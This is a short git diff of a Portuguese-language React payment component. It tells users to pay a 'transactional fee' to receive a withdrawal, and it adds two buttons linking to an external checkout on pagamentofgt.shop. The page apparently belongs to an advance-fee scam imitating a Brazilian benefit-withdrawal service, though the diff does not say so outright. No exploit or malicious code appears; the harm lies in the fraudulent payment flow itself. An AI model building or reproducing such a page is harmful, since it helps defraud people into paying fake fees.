@@ -143,9 +143,13 @@ export function PagamentoTarifa() {
                         Clique no botão abaixo para realizar o pagamento da tarifa transacional e receber o seu saque!
                     </p>
 
-                    <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
-                        Realizar Pagamento
-                    </button>
+                    <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                        <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
+                            Realizar Pagamento
+                        </button>
+                    </a>
+
+
 
                     <div>
                         <p className="text-zinc-400 font-semibold text-center mt-4 text-sm">
@@ -180,6 +184,12 @@ export function PagamentoTarifa() {
                                 </div>
                             </div>
                         ))}
+
+                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                            <button className="bg-orange-400 w-full py-3 font-bold rounded-md text-white mt-4 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300">
+                                Realizar Pagamento
+                            </button>
+                        </a>
                     </div>
                 </div>
             </div>
